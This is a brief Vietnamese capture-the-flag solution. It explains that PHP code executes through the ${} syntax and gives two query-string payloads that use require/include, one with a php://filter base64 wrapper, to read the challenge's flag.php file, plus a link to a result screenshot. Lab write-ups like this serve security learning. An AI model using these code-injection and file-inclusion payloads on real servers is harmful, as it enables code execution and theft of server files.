# Solution

Ta có thể thực thi php code với syntax `${}`

Payload:

`?q=${require%09$_GET[0]}${flag}&0=flag.php`

hoặc

`?q={${include$_GET[a]}}&a=php://filter/read=convert.base64-encode/resource=/flag.php`

Kết quả:

![5](https://user-images.githubusercontent.com/77546253/173381259-6c15e3c3-d057-47af-b333-aa540951019e.png)
